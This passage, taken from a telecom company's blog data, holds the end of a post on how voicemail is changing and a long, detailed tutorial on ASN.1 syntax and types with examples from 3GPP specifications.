name. To some, that might be a differentiator, to others a nuisance.\\n\\nBesides, Luke tells me, how dying is voicemail really, when in New Zealand, there are two million voicemails left every day, in a population of 4,6 million?\\n\\n### A vocal assistant\\n\\nKarel Bourgois paints a similar picture. He\u2019s the CEO of [Voxist](https://www.voxist.com), a voicemail and messaging app, based in France. He\u2019s seen voicemail transform into more of a productivity tool for businesses. Young people might still play around with things like customizing their voicemail greetings to individual callers, but in general, they don\u2019t like talking.\\n\\n<img src=\\"/img/blog/voicemail.jpeg\\" alt=\\"Breaking up via voicemail\\" width=\\"300\\"/>\\n\\n> \u201cI see voicemail becoming more like a vocal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation,\u201d Karel says.\\n\\nSo voicemail systems continue to evolve. Users either don\u2019t want voicemail or they want a voicemail service that can travel with them across devices, operators and national borders.\\n\\nTo Luke Campbell, the very challenge of requiring people dial into a voicemail service and listen to a bunch of commands before you get to your messages was in itself a problem big enough to be solved for kickstarting his business. Vxt started as a voice messaging service and today has evolved into a communication automation company, echoing Karel\u2019s observations.\\n\\n### The routes you can go down\\n\\nIf you want to improve the voicemail experience, one route you can go down is to add more features, to make it more flexible and powerful.\\n\\nAnother route is to make the user experience simpler. To make it easier and faster to listen to voicemail.\\n\\nThat\u2019s essentially what Working Group Two and the Swedish mobile operator challenger [Vimla](https://vimla.se) did. In response to a regulatory challenge by the Swedish Post & Telecom Authority (PTS), Vimla recently launched a voicemail service where messages get delivered to a user\u2019s phone as an audio file (via MMS). The customer can listen to it whenever he/she wants without needing to dial into the messaging system. As a result, hackers can no longer get access to other people\u2019s voicemails (which PTS had set out to stop) and customers get a better messaging experience.\\n\\nThis simple, yet elegant solution serves as a powerful example of another and more fundamental development in the telecom industry. For a few years, Working Group Two has developed and managed the mobile core network of Vimla as-a-service in the cloud, enabling Vimla to operate its network both more efficiently and taking advantage of micro innovation at scale. When this challenge came around from PTS it took Vimla only a few months to respond with this lightweight and efficient solution. Working Group Two\u2019s developers used existing APIs to connect two otherwise separate systems (voicemail and MMS). The API-based bridge between them allowed voicemails to be sent as MMS. Today, tens of thousands messages are sent every day in the Vimla network.\\n\\n> \u201cWe genuinely think this is a better product for our customers,\u201d says Viktor Georgsson, Head of Operations with Vimla.\\n\\nOther operators in Sweden responded to the PTS requirements by beefing up their security systems and protecting voicemail inboxes with longer authentication codes and more rigorous encryption. Perhaps at the expense of the customer experience.\\n\\n### Ask yourself four questions...\\n\\nAt the end of the day, voicemail must face the test of any other digital product, says Marius Waldum, the Head of Product at Working Group Two. He\u2019s in charge of the effort of developing the company\u2019s ecosystem platform - where third party digital products are developed to run and meet users across multiple operators worldwide. Working Group Two has developed a standardized voicemail product called Voicebox, from which Vimla\u2019s solution took its inspiration.\\n\\nYou need to ask yourself four questions, Marius points out. First, is the product **valuable** to its users? Is it **usable** for them? Is it **possible to build**? And is it **economically viable**?\\n\\n> \u201cVoicemail is a powerful reminder that a product doesn\u2019t need to be desired by everyone, but by someone,\u201d Marius concludes."},{"id":"the-specs-behind-the-specs-part-1","metadata":{"permalink":"/blog/the-specs-behind-the-specs-part-1","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-01-11-the-spec-behind-the-specs.md","source":"@site/../blog/2022-01-11-the-spec-behind-the-specs.md","title":"The specs behind the specs part 1","description":"\\"Abstract Syntax Notation One (ASN.1) is a standard interface","date":"2022-01-11T00:00:00.000Z","formattedDate":"January 11, 2022","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"ASN.1","permalink":"/blog/tags/asn-1"},{"label":"dia","permalink":"/blog/tags/dia"}],"readingTime":31.13,"hasTruncateMarker":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Tech Lead for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"/img/author-photos/swo.jpg","key":"seba"}],"frontMatter":{"slug":"the-specs-behind-the-specs-part-1","title":"The specs behind the specs part 1","date":"2022-01-11T00:00:00.000Z","tags":["telco","ASN.1","dia"],"authors":"seba"},"prevItem":{"title":"Don\'t leave a message after the beep","permalink":"/blog/please-dont-leave-a-message-after-the-beep"},"nextItem":{"title":"Zero-day vulnerabilities - Log4j","permalink":"/blog/log4j-security-vulnerability"}},"content":"\\"Abstract Syntax Notation One (ASN.1) is a standard interface\\ndescription language for defining data structures that can be\\nserialized and deserialized in a cross-platform way.\\" -\\n[Wikipedia](https://en.wikipedia.org/wiki/ASN.1)\\n\\n\x3c!--truncate--\x3e\\n# Introduction\\n\\nToday you\'ll read about a specific language used to describe many of\\nthe messages in the telecom specifications. It will be a deep-dive\\ninto technical parts, so I imagine you could just use the blog post\\nwhen you want to look up different parts without fully reading it.\\n\\nIn **wgtwo** we use this language for some specific telco\\nmessages (such as SIGTRAN layers TCAP/MAP/CAP, as well as S1AP, NGAP\\nand probably some more). They are defined directly in some of the\\ntelecom specifications, and because of that it is possible to use them\\nto send messages between different telecom cores.\\n\\nThis will *probably* be a two piece blog post as there is another\\ninterface describing language which is not ASN.1, and this is already\\na very long post. The other specification is used in Diameter\\ndictionaries, but I\'ll spare those for now. It has already taken me\\nabout half a year to finish up this article.\\n\\nThere might be some Erlang specific paragraphs here and there, but\\nthis blog post is mainly about ASN.1 as a specification, which can be\\nused in any language supporting it.  For Erlang specifics I came\\nacross [this blog\\npost](https://medium.com/erlang-battleground/erlang-asn-1-abstract-syntax-notation-one-deeb8300f479)\\nwritten by Viacheslav Katsuba, and because it is build into Erlang by\\ndefault I recommend the\\n[APIs](https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html)\\nas well.\\n\\n**DISCLAIMER: SEVERE HEADACHE MIGHT FOLLOW.**\\n\\n# Abstract Syntax Notation One\\n\\nAbstract Syntax Notation One (ASN.1 for short) provides a\\nhigh level description of messages. It abstracts the language\\nimplementations from the protocol design.\\n\\nIt was initially used by [Open Systems Interconnection\\n(OSI)](https://en.wikipedia.org/wiki/Open_Systems_Interconnection) to\\ndescribe email messages but is used by many other applications\\nespecially within telecommunications and cryptography.\\n\\nYou might have heard of similar such abstract syntax notations used\\nfor interface definitions such as Google Protocol Buffers, or\\nFacebook\'s Apache Thrift, but those languages have not been managed by\\na standardization organization, so the owning corporations could (in\\ntheory) make breaking changes or change the license or even remove the\\nlanguage definitions overnight.\\n\\nAnyway, back to ASN.1\\n\\nThe first ASN.1 standardization came out 1984, and there have been\\nmany improvements since, for instance with the 1994 update which added\\nextended functionality for telecommunication technologies.\\n\\n\\"Long live ASN.1!\\" - Olivier Dubuisson from the [best\\nbook](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html#dubuisson)\\nthat I\'ve read on the subject. (How many ASN.1 books are there you\\nmight wonder? Actually there were [more\\nbooks](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html)\\nthan I expected on the subject, but to make it perfectly clear: I did\\nonly read the one.)\\n\\nOff-topic but a bit of a fun fact I got from reading the book which I\\ndidn\'t know about before is that \'little Endian\' and \'big Endian\',\\nwhich are used to denote if the bitstring should be read from leftmost\\nor rightmost bit, actually originates from the 1726 best-seller\\n[Gulliver\'s\\ntravels](https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm).\\n\\n## The how and why\\n\\nASN.1 builds on the following ideas:\\n\\n- Data structures to be transmitted should be described regardless of\\n  programming language used transmitting or receiving them.\\n- The notation should allow building complex data types from basic\\n  types, and be able to do so recursively.\\n- The notation must be formal to prevent ambiguities.\\n\\nThat said, ASN.1 is not an abstract syntax in itself, but a language\\nto describe abstract syntaxes.\\n\\nThere are currently four main ASN.1 specifications (listed below), as\\nwell as at least one specification per encoding rule (listed in the\\n[last section](#encodings)).\\n\\n\\n| ITU-T no                                                                               | ASN.1 specifications                                                           |\\n| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |\\n| [X.680](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.680) | Abstract Syntax Notation One (ASN.1): Specification of basic notation          |\\n| [X.681](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.681) | Abstract Syntax Notation One (ASN.1): Information object specification         |\\n| [X.682](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.682) | Abstract Syntax Notation One (ASN.1): Constraint specification                 |\\n| [X.683](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.683) | Abstract Syntax Notation One (ASN.1): Parameterization of ASN.1 specifications |\\n\\n\\n# Nitty gritty\\n\\n## Modules\\n\\nThe purpose of an ASN.1 module is to name a collection of types and/or\\nvalue definitions.\\n\\nIt consist of a module reference and an optional object identifier\\ntogether with the declaration of the `DEFINITIONS` type definition.\\nNote that even though the object identifier is optional, it is\\nconsidered bad practice to leave it out. The reason for it being\\noptional is for backward compatibility; it was not part of the\\noriginal ASN.1 specification.\\nThe `DEFINITIONS` keyword usually comes together with the `BEGIN` and\\n`END` keywords so multiple definitions can be done. (What else is the\\npoint of a module if not to make a collection...).\\n\\nThe Erlang ASN.1 compiler requires each module to be in a separate\\nfile, but generally one ASN.1 file could contain many modules.  Usual\\nfile endings are `.asn` and `.asn1`. One\\n[trick](https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html#multi-file-compilation)\\nthat can be used to circumvent this Erlang specific problem is to list\\nmultiple ASN.1 files in a new file ending with `set.asn`.\\n\\n\x3c!-- THIS LINK IS/WAS BROKEN 2022-12-23 AND IS THUS COMMENTED OUT\\nOne example of a file with many modules exist in the CAP specification\\n[3GPP TS 29.078](https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1597)\\n--\x3e\\n\\nThe ASN.1 template for a module\\n```asn.1\\nModuleReference ObjectIdentifier\\nDEFINITIONS ::= BEGIN\\n\\nEND\\n```\\nas seen in an example\\n\\n```asn.1\\nCAP-operationcodes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1)\\nmodules(3) cap-operationcodes(53) version8(7)}\\n\\nDEFINITIONS ::= BEGIN\\n```\\n\\nFor information about the object identifier see the [types section](#object-identifier)\\n\\n### Importing from other modules\\n\\nImporting types, values and other structures from other modules can be\\ndone with the `IMPORTS` and `FROM` keywords in the beginning of the\\nmodule body.  The `IMPORTS` keyword ends with a single semicolon `;`,\\nand the different imported definitions are comma-separated.\\n\\nThe meaning of the optional `IMPLICIT TAGS` keywords I\'ll handle\\n[later](#automatic-implicit-explicit-tags).\\n\\n```asn.1\\nCAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n\\nIMPORTS\\n\\n\\tDuration,\\n\\tInteger4,\\n\\tInterval,\\n\\tLegID,\\n\\tServiceKey\\nFROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)\\nmodules(0) cs1-datatypes(2) version1(0)}\\n\\n\\tBothwayThroughConnectionInd,\\n\\tCriticalityType,\\n\\tMiscCallInfo\\nFROM CS2-datatypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)\\ncs2(20) modules(0) in-cs2-datatypes(0) version1(0)}\\n\\n-- ...more imports...\\n; -- IMPORTS end here\\n\\nEND -- CAP-datatypes ends here --\\n\\n-- CAP-errortypes module starts here --\\nCAP-errortypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-errortypes(51) version8(7)}\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n\\n\\nEND -- CAP-errortypes ends here --\\n```\\n\\nThe type definitions `Duration` and `LegID` above are imported from\\n`CS1-DataTypes` module, while `MiscCallInfo` comes from\\nthe `CS2-datatypes` module.\\n\\n### Exporting from a module\\n\\nExports from a module are done in a similar fashion.\\n\\nIf the `EXPORT` keyword is not used in a module, the ASN.1 compilers\\nshould export all values and types from the module. It\'s the same as\\nspecifying `EXPORTS ALL;`.\\n\\n```asn.1\\nCAP-GPRS-ReferenceNumber {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)\\numts-network(1) modules(3) cap-dialogueInformation(111) version8(7)}\\n\\nDEFINITIONS ::= BEGIN\\n\\nEXPORTS\\n\\tid-CAP-GPRS-ReferenceNumber,\\n\\tcAP-GPRS-ReferenceNumber-Abstract-Syntax;\\n\\nIMPORTS\\n\\n\\tInteger4\\nFROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)\\nmodules(0) cs1-datatypes(2) version1(0)}\\n;\\n\\nEND\\n```\\n\\n### Commenting\\n\\nAs can be seen in the above example one can enter comments into the\\nASN.1.  Comments starts with double dash `--` and ends with either a\\nnewline or another `--`, whichever comes first.\\n\\n## Assignments and naming\\n\\nThe rules specify that type references must start with an uppercase\\nletter and may not end with a dash `-`. It may also only contain\\nupper- and lower-case letters, digits or dashes `-`.  The syntax for a\\ntype assignment is\\n\\n```asn.1\\nTypeRef ::= TypeDefinition\\n```\\n\\nFor instance\\n```asn.1\\nInvokeIdType ::= INTEGER (-128..127)\\n\\nCancelArg ::= CHOICE {\\n    invokeID        [0] InvokeID,\\n    allRequests     [1] NULL\\n}\\n\\nDuration ::= INTEGER (-2..86400)\\n\\nInteger4 ::= INTEGER (0..2147483647)\\n\\nInterval ::= INTEGER (-1..60000)\\n\\nInvokeID ::= InvokeIdType\\n\\nLegID ::= CHOICE {\\n    sendingSideID   [0] LegType,\\n    -- used in operations sent from SCF to SSF\\n    receivingSideID [1] LegType\\n    -- used in operations sent from SSF to SCF\\n}\\n\\nLegType ::= OCTET STRING (SIZE(1))\\n\\nServiceKey ::= Integer4\\n```\\n\\nValue references have a similar syntax as type references except that\\nvalue references must start with a lower-case letter, and also carry\\nthe values type.\\n\\nSyntax\\n```asn.1\\nvalueRef Type ::= value\\n```\\n\\nFor example\\n```asn.1\\nleg1 LegType ::= \'01\'H\\nleg2 LegType ::= \'02\'H\\n\\nhighLayerCompatibilityLength            INTEGER ::= 2\\nminAChBillingChargingLength             INTEGER ::= 0\\n```\\n\\n# Types\\n\\nNow when we have talked a bit about naming references, and how to\\nassign values and types I\'ll go over which built-in types exist, and\\nhow to create new types.\\n\\nThere are some common types, each consists of a type reference and a\\ntag number.  The tag number is used to identify it when sending the\\ntype in the network.  The universal tags are specified in [ITU-T\\nX.680](https://www.itu.int/rec/T-REC-X.680/en)\\n\\nHere is a list of the most common types\\n\\n| Type                                    | Universal Tag Number |\\n| --------------------------------------- | -------------------- |\\n| [BOOLEAN](#boolean)                     | 1                    |\\n| [INTEGER](#integer)                     | 2                    |\\n| [BIT STRING](#bit-string)               | 3                    |\\n| [OCTET STRING](#octet-string)           | 4                    |\\n| [NULL](#null)                           | 5                    |\\n| [OBJECT IDENTIFIER](#object-identifier) | 6                    |\\n| [EXTERNAL](#external)                   | 8                    |\\n| [REAL](#real)                           | 9                    |\\n| [ENUMERATED](#enumerated)               | 10                   |\\n| [UTF8String](#string-types)             | 12                   |\\n| [TIME](#time-types)                     | 14                   |\\n| [SEQUENCE (OF)](#sequence-of)           | 16                   |\\n| [SET (OF)](#set-of)                     | 17                   |\\n| [NumericString](#string-types)          | 18                   |\\n| [IA5String](#string-types)              | 22                   |\\n| [UTCTime](#time-types)                  | 23                   |\\n| [GeneralizedTime](#time-types)          | 24                   |\\n| [VisibleString](#string-types)          | 26                   |\\n| [DATE](#time-types)                     | 31                   |\\n| [TIME-OF-DAY](#time-types)              | 32                   |\\n| [DATE-TIME](#time-types)                | 33                   |\\n| [DURATION](#time-types)                 | 34                   |\\n|                                         |                      |\\n| [CHOICE](#choice)                       | *                    |\\n| [SELECTION](#selection)                 | *                    |\\n\\n\\nThe common types can be divided into simple and structured types.\\nStructured types are the composition of multiple types (so called\\ncomponent types) using one of the following types and keywords\\n`SEQUENCE`, `SEQUENCE OF`, `SET`, `SET OF`, `CHOICE`, and/or\\n`SELECTION`.  Note that `CHOICE` and `SELECTION` does not [need to]\\nhave their own universal tags, due to those are consisting of other\\ntypes.\\n\\n## Basic types\\n\\n### BOOLEAN\\n\\nThe `BOOLEAN` type takes values `TRUE` or `FALSE`.\\n\\n```asn.1\\nAudibleIndicator ::= CHOICE {\\n    tone       BOOLEAN,\\n    burstList  [1] BurstList\\n}\\n\\n```\\n\\nHere the value `tone` of the composit type `AudibleIndicator` is of\\ntype `BOOLEAN`. Note: It was one of the cleanest example I could find\\nof a `BOOLEAN` in the ASN.1 files we use, because Telco often use a\\nspecial \\"trick\\" when it comes to booleans in order to save bandwidth,\\ni.e. the `NULL` type.\\n\\n### NULL\\n\\nThe `NULL` type is basically a placeholder, where the recognition of a\\nvalue is important but the actual value is not.\\n\\nIn 3GPP it is similar to `BOOLEAN` in the sense that a defined `NULL`\\nvalue is considered `TRUE` and if the value is missing it is\\nconsidered `FALSE`. The reason for this is that when sent over the\\nnetwork with [BER encoding](#encodings), it will take no space because\\n`BOOLEAN` is always of length 1 but `NULL` is always length 0,\\ni.e. `NULL` does not contain a value.\\n\\n```asn.1\\nCancelArg {PARAMETERS-BOUND : bound} ::= CHOICE {\\n    invokeID            [0] InvokeID,\\n    allRequests         [1] NULL,\\n    callSegmentToCancel [2] CallSegmentToCancel {bound}\\n}\\n```\\n\\nin this example `allRequests` can be defined (then only the tag is\\ntransmitted) or not at all.\\n\\n### INTEGER\\n\\n`INTEGER` takes any of the infinite set of integer values. It can also\\nhave the additional notation that names some of the values.\\n\\n\\n```asn.1\\nGSMMAPOperationLocalvalue ::= INTEGER{\\n    updateLocation (2),\\n    cancelLocation (3),\\n    provideRoamingNumber (4),\\n    noteSubscriberDataModified (5),\\n    resumeCallHandling (6),\\n    insertSubscriberData (7),\\n    -- rest of the named integers --\\n}\\n```\\n\\n```asn.1\\nlocalvalue1 GSMMAPOperationLocalvalue ::= updateLocation\\nlocalvalue2 GSMMAPOperationLocalvalue ::= 2\\nlocalvalue3 GSMMAPOperationLocalvalue ::= -55413459\\n```\\nare all valid `GSMMAPOperationLocalvalue`s.\\n\\n### ENUMERATED\\n\\n`ENUMERATED` has the same interpretation as `INTEGER` but will hold\\nspecific values only.\\n\\n\\n```asn.1\\nRequestedInformationType ::= ENUMERATED {\\n    callAttemptElapsedTime(0),\\n    callStopTime(1),\\n    callConnectedElapsedTime(2),\\n    calledAddress(3),\\n    releaseCause(30)\\n}\\n```\\n\\n```asn.1\\nreqInfoType1 RequestedInformationType ::= callAttemptElapsedTime\\nreqInfoType2 RequestedInformationType ::= 0\\n```\\n\\nare both valid values of `RequestInformationType`, while this is not:\\n\\n```asn.1\\nnotValidReqInfoType RequestedInformationType ::= 4\\n```\\n\\n### BIT STRING\\n\\n`BIT STRING` takes values that are a sequence of zero or more bits. It\\ncan also take an additional notation that name certain bits in the bit\\nsequence.\\n\\n```asn.1\\nDeferredLocationEventType ::= BIT STRING {\\n    msAvailable (0) ,\\n    enteringIntoArea (1),\\n    leavingFromArea (2),\\n    beingInsideArea (3) ,\\n    periodicLDR (4)\\n} (SIZE (1..16))\\n```\\n\\n```asn.1\\neventType1 DeferredLocationEventType ::= (msAvailable, beingInsideArea)\\neventType2 DeferredLocationEventType ::= \'10010\'B\\neventType3 DeferredLocationEventType ::= \'12\'H\\n```\\n\\nare all valid value definitions of the same bit sequence where the\\nfirst and third bits are set, and no other bits are set.  The `B` stands\\nfor binary representation and `H` for hexadecimal representation.\\n\\nThe `SIZE` is a constraint on the type defining it to be of a specific\\nlength. This keyword comes as an extra notation for many of the\\n`STRING` types below (as well as some of the other types).\\n\\n### OCTET STRING\\n\\nType `OCTET STRING` takes values that are an ordered sequence of zero\\nor more (eight-bit) octets.\\n\\n```asn.1\\nMM-Code ::= OCTET STRING (SIZE (1))\\n```\\n\\nIn the same manner as `BIT STRING` both values below are valid\\ninstances of `MM-Code`:\\n\\n```asn.1\\niMSI-Attach1 MM-Code ::= \'00000010\'B\\niMSI-Attach2 MM-Code ::= \'02\'H\\n```\\n\\nwhile\\n\\n```asn.1\\nnotValidIMSI-Attach MM-Code ::= \'10010\'B\\n```\\n\\nis not considered a valid value due to it not being a multiple of eight bits.\\n\\n### OBJECT IDENTIFIER\\n\\nThe `OBJECT IDENTIFIER` type (shortened `OID`) names information\\nobjects such as ASN.1 modules. The named information object is a node\\non an object identifier tree that is managed at the international\\nlevel.\\n\\nETSI for instance is managed by ITU-T\\n`itu-t(0) identified-organization(4) etsi(0)`\\n\\n<div>\\n    <img src=\\"/img/blog/the-specs-behind-the-specs/etsi_asn1oidtree.gif\\" alt=\\"ETSI OID tree\\" />\\n</div>\\n\\nand as can see in the `Modules` example version 8 of cap-datatypes is part of ETSI.\\n`CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}`\\n\\nOther root arcs\\n\\n| Root | Organization    |\\n| ---- | --------------- |\\n| 0    | ITU-T           |\\n| 1    | ISO             |\\n| 2    | joint-iso-itu-t |\\n\\nThe labels are optional and the reference could also be written as `{0\\n4 0 0 1 3 52 7}`. Only positive integers are allowed including zero (0).\\n\\nAnother example comes from the CAP-object-identifiers module in ETSI 129.078.\\n\\n```asn.1\\ntc-Messages OBJECT IDENTIFIER ::=\\n    {itu-t recommendation q 773 modules(2) messages(1) version3(3)}\\n\\nid-CAP OBJECT IDENTIFIER ::=\\n    {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)\\n     umts-network(1) cap4(22)}\\n\\nid-ac OBJECT IDENTIFIER ::= {id-CAP ac(3)}\\n```\\n\\n`id-ac` is a child of the `id-CAP` object identifier.\\n\\nOne could lookup object identifiers by visiting this amazing\\n[page (oidref.com)](https://oidref.com/).\\n\\n### EXTERNAL\\n\\n`EXTERNAL` represents a value that does not need to be specified as a\\nASN.1 type. It carries information on how the data should be interpreted.\\n\\n```asn.1\\nUnidirectional {OPERATION:Invokable, OPERATION:Returnable} ::= SEQUENCE {\\n  dialoguePortion  DialoguePortion OPTIONAL,\\n  components       ComponentPortion{{Invokable}, {Returnable}}\\n}\\n\\nDialoguePortion ::= [APPLICATION 11] EXPLICIT EXTERNAL\\n```\\n\\nHere the value `dialoguePortion` will have tag 11 if specified, it is\\nthen up to the application to decide how to deal with the value.\\n\\n### REAL\\n\\nValues of the type `REAL` will take a triplet of numbers (m, b, e),\\nwhere m is the mantissa (a signed number), b the base (2 or 10), and e\\nthe exponent (a signed number).\\n\\nThere are also three special values it can take `PLUS-INFINITY`, `0`,\\nand `MINUS-INFINITY`.\\n\\n```asn.1\\ntheBestRealValue REAL ::= (123, 10, -2) -- 1.23\\nmaxValue REAL ::= PLUS-INFINITY\\n```\\n\\n### String types\\n\\nI feel like most of the string types are the same, except that they\\nall take diffrent character sets. I\'ve already described `BIT STRING`\\nand `OCTET STRING` which both operate the bit set, but there is a\\nlot of others that operate over character sets.\\n\\n\\n\\n| Type                         | Tag | Character set regex/comment                                                                                                                                                                   |\\n| ---------------------------- | --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\\n| UTF8String                   | 12  | Synonymous with UniversalString at abstract level                                                                                                                                             |\\n| NumericString                | 18  | `[0-9 ]`                                                                                                                                                                                      |\\n| PrintableString              | 19  | `[A-Za-z0-9\'()+,./:=? -]`                                                                                                                                                                     |\\n| TelexString (T61String)      | 20  | [ISO-IR] reg. #6, #87, #102, #103, #106, #107, #126, #144, #150, #153, #156, #164, #165, #168 + space,delete               |\\n| VideotexString               | 21  | [ISO-IR] reg. #1, #13, #72, #73, #87, #89, #102, #108, #126, #128, #129, #144, #150, #153, #164, #165, #168 + space,delete |\\n| IA5String                    | 22  | [ISO-IR] reg. #1, #6 + space,delete                                                                                        |\\n| GraphicString                | 25  | [ISO-IR] graphical sets (called \'G\') + space                                                                               |\\n| VisibleString (ISO646String) | 26  | [ISO-IR] reg. #6 + space                                                                                                   |\\n| GeneralString                | 27  | [ISO-IR] graphical sets (called \'G\'), control characters (called \'C\') + space,delete                                       |\\n| UniversalString              | 28  | [ISO10646-1]                                                                                                                                                                                  |\\n| BMPString                    | 30  | Basic Multilingual Plane; subtype of UniversalString                                                                                                                                          |\\n\\n\\n[ISO-IR] (ISO International Register of Coded Character Sets To Be\\nUsed With Escape Sequences) is a pretty good source, it reference most\\nof the registers but not all of them. The\\ncharacter-sets are registered with\\n[IANA](https://www.iana.org/assignments/character-sets/character-sets.xhtml)\\n\\n\\n\\nI\'ll list some examples of string types found in our ASN.1 files:\\n\\n```asn.1\\nAMFNameUTF8String ::= UTF8String (SIZE(1..150, ...))\\n\\nDirectoryString ::= CHOICE {\\n    teletexString TeletexString (SIZE (1..maxSize)),\\n    printableString PrintableString (SIZE (1..maxSize)),\\n    universalString UniversalString (SIZE (1..maxSize)),\\n    bmpString BMPString (SIZE (1..maxSize))\\n--    utf8String UTF8String (SIZE (1..maxSize))\\n    }\\n\\nDisplayInformation ::= IA5String (SIZE (minDisplayInformationLength..maxDisplayInformationLength))\\n```\\n`IA5String` is used to represent ISO 646 (IA5; International Alphabet 5)\\ncharacters.  The entire character set contains precisely 128\\ncharacters and are generally equivalent to the first 128 characters of\\nthe ASCII alphabet.\\n\\nThere are multiple formats for the values of `UniversalString`, `BMPString` and\\n`UTF8String` types. One could either specify a quadruple with `{group,\\nplane, row, cell}` for the character needed, or an array of defined values (strings).\\n\\nAn example from Dubuisson:\\n\\n```asn.1\\nlatinCapitalLetterA UniversalString ::= {0,0,0,65}\\ngreekCapitalLetterSigma UniversalString ::= {0,0,3,145}\\n\\nmy-string UniversalString ::= {\\n    \\"This is a capital A: \\", latinCapitalLetterA,\\n    \\", and a capital alpha: \\", greekCapitalLetterAlpha,\\n    \\"; try and spot the difference!\\"}\\n```\\n\\nAnd X.680 gives us yet another example\\n\\n```asn.1\\nIMPORTS\\n  BasicLatin, greekCapitalLetterSigma\\n  FROM ASN1-CHARACTER-MODULE\\n    { joint-iso-itu-t asn1(1) specification(0) modules(0) iso10646(0) };\\n\\n MyAlphabet ::= UniversalString (FROM (BasicLatin | greekCapitalLetterSigma))\\n\\n mystring MyAlphabet ::= { \\"abc\\" , greekCapitalLetterSigma , \\"def\\" }\\n```\\n\\n### Time types\\n\\nThe `UTCTime` and `GeneralizedTime` types are actually specified as\\n`VisibleString`.\\n\\n`UTCTime` format is \\"YYMMDD\\" for date followed by \\"hhmm\\" or \\"hhmmss\\"\\nfor time, ending with either \\"z\\", \\"-hhmm\\" or \\"+hhmm\\" for time offset.\\n\\nSpecifying \\"2021-12-14 04:32 CET\\" in `UTCTime`\\n\\n```asn.1\\n\\"2112140332Z\\"\\n\\"2112140432+0100\\"\\n```\\n\\n`GeneralizedTime` gives a bit more flexibility with regards to the format.\\n\\nIt consists of a calendar date of format \\"YYYYMMDD\\", followed by\\neither \\"hh\\", \\"hhmm\\", \\"hhmmss\\" and optional parts \\".[0-9]+\\", and\\noptionally ending with the coordinated universal time character \\"z\\" or\\nthe time offset in hours/minutes \\"-hhmm\\" or \\"+hhmm\\".\\n\\nThese are the same, but one with higher precision and in local time.\\n```asn.1\\n\\"2021121403.54Z\\" -- 3.54 hours after midnight\\n\\"20211214043227.981935+0100\\" -- 3 hours, 32 minutes, 27 seconds, 981935 microseconds\\n```\\n\\n`DATE`, `TIME-OF-DAY`, `DATE-TIME` and `DURATION` was introduced after\\nthe third generation of ISO 8601 was released 2004.\\n\\nThey are defined as subsets of `TIME`.\\n\\n```asn.1\\nDATE ::= [UNIVERSAL 31] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Date Date=YMD Year=Basic\\")\\nTIME-OF-DAY ::= [UNIVERSAL 32] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Time Time=HMS Local-or-UTC=L\\")\\nDATE-TIME ::= [UNIVERSAL 33] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Date-Time Date=YMD Year=Basic Time=HMS Local-or-UTC=L\\")\\nDURATION ::= [UNIVERSAL 34] IMPLICIT TIME\\n       (SETTINGS \\"Basic=Interval Interval-type=D\\")\\n```\\n\\nAs I can find no real world examples from our ASN.1-files, I\'m forced\\nto make-up examples of these\\n\\n```asn.1\\ndate1 DATE ::= \\"211214\\"\\ntime1 TIME-OF-DAY ::= \\"043227\\"\\ndate-time1 DATE-TIME ::= \\"211214043227\\"\\nduration1 DURATION ::= \\"P0Y29M0DT0H0M0S\\" -- 29 months to an accuracy of 1 second\\n```\\n\\nValues of type `DURATION` starts with \\"P\\" followed by alot of\\ndifferent optional parts and formats.  If the time designation is used\\nit should start with a \\"T\\" to keep months and minutes separate.\\n\\n```asn.1\\nduration2 DURATION ::= \\"P2MT2M\\" -- 2 months and 2 minutes\\nduration3 DURATION ::= \\"P29M0DT0.00M\\" -- 29 months with accuracy of one-hundredth of a minute\\nduration4 DURATION ::= \\"P32W\\" -- 32 weeks\\n```\\n\\n\\n## Structured types\\n\\n### CHOICE\\n\\nThe type `CHOICE` can take values from one of multiple types, `CHOICE`\\ndoesn\'t have it\'s own universal tag.\\n\\n```asn.1\\nCancelArg ::= CHOICE {\\n    invokeID        [0] InvokeID,\\n    allRequests     [1] NULL\\n}\\n```\\n\\nThe value of type `CancelArg` will either of an `InvokeID` type, or a\\n`NULL` type.  It will be tagged `[0]` or `[1]` respectively, that is\\nwhy `CHOICE` doesn\'t have it\'s own universal tag, as it is derived\\nfrom ASN.1 specification.\\n\\n### SEQUENCE (OF)\\n\\n`SEQUENCE` and `SEQUENCE OF` are used for composing multiple types.\\n\\n```asn.1\\nEventTypeSMS ::= ENUMERATED {\\n    sms-CollectedInfo                   (1),\\n    